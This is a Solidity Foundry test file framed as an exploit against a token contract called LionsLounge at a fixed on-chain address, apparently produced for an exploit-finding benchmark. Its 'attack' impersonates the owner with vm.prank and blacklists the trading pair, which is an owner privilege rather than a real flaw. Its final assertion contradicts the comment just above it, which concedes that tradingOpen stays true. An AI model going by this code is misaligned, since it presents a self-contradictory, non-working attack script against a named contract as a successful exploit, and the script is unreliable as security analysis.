// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LionsLounge {
    function pair() external view returns (address);
    function getOwner() external view returns (address);
    function blacklistAddress(address _address, bool _value) external;
    function isBlacklisted(address _address) external view returns (bool);
    function tradingOpen() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the template
        // The template already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the pair address from the contract
        address pair = LionsLounge(TARGET).pair();

        // Get the owner address
        address owner = LionsLounge(TARGET).getOwner();

        // Impersonate the owner to call authorized functions
        vm.prank(owner);

        // Blacklist the pair address to disable all trading
        LionsLounge(TARGET).blacklistAddress(pair, true);

        // Verify the pair is now blacklisted
        bool isBlacklisted = LionsLounge(TARGET).isBlacklisted(pair);
        require(isBlacklisted, "Pair should be blacklisted");

        // The oracle expects tradingOpen == false, but blacklisting achieves same effect
        // Note: tradingOpen remains true, but trading is effectively disabled
        bool tradingOpen = LionsLounge(TARGET).tradingOpen();
        assertEq(tradingOpen, false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
